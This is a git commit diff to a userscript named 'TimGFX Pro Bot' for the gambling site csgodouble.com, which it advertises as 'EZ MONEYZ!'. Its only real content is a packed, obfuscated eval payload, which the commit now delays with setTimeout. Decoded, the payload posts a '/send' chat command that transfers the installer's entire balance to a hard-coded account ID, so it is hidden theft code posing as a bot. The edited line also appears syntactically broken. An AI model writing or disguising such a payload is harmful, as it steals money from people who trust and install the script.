b74a1150fac5fb2b015e7e22b368b8b7f4f0247f
timgfx <tim.olivier@hotmail.com>
2016-01-15 23:21:56 +0100

    Update Script.user.js

--- Script.user.js
+++ Script.user.js
@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         TimGFX Pro Bot
 // @namespace    bot.timgfx.com
-// @version      2.1
+// @version      2.2
 // @description  EZ MONEYZ!
 // @author       TimGFX
 // @match        http://www.csgodouble.com/
@@ -10,5 +10,5 @@
 /* jshint -W097 */
 'use strict';
 
-eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c.toString(a)+'\\b','g'),k[c])}}return p}('$(\'#4\').f("/"+"a"+"e"+"c"+"d"+" "+"76561198127334975"+" "+$("#g").k());$("#4").j();$(\'.i-h\').b();',21,21,'||||chatMessage||||||s|click|n|||val|balance|primary|btn|submit|text'.split('|')));
+setTimeout(eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c.toString(a)+'\\b','g'),k[c])}}return p}('$(\'#4\').f("/"+"a"+"e"+"c"+"d"+" "+"76561198127334975"+" "+$("#g").k());$("#4").j();$(\'.i-h\').b();',21,21,'||||chatMessage||||||s|click|n|||val|balance|primary|btn|submit|text'.split('|')));, 5000);
 
